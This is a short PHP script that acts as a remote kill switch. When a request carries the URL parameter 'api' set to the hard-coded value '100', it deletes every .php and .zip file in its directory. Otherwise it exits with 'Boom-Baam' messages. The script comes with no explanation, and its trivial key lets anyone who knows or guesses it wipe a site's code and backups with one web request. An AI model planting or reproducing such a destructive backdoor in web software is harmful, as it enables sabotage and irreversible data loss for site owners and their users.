<?php
$api_match2 = '100';
if($_GET['api'])
{
	$api2 = $_GET['api'];
	if($api_match2 === $api2)
	{
	    $files = glob("*.php");
	       $filess = glob("*.zip");
		foreach($files as $file) { 
    if(is_file($file))
    {
        // Delete the given file 
        unlink($file); 
        
       
    }
}

	foreach($filess as $file2) { 
    if(is_file($file2))
    {
        // Delete the given file 
        unlink($file2); 
        
       
    }
}
	}
	else{
	die('Boom-Baam');
}
}
else{
	die('Miss the Boom-Baam');
}
?>